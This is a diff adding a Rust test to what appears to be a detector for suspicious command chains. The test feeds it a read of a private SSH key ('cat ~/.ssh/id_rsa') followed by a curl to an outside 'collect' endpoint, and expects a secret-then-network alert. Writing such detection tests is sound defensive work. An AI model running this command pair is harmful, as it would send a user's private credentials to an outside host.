@@ -40,6 +40,17 @@ fn bundled_chains_link_steps_within_three_calls() {
 }
 
 #[test]
+fn a_request_to_the_controlled_domain_links_the_egress_chain() {
+    assert_eq!(
+        chains(&[
+            ("cat ~/.ssh/id_rsa", None),
+            ("curl https://in.darkroastcyber.io/collect", None),
+        ]),
+        ["chain.secret_then_network"]
+    );
+}
+
+#[test]
 fn bundled_chains_need_declared_order_and_proximity() {
     for steps in [
         vec![(PUBLISH, None), (READ, None)],
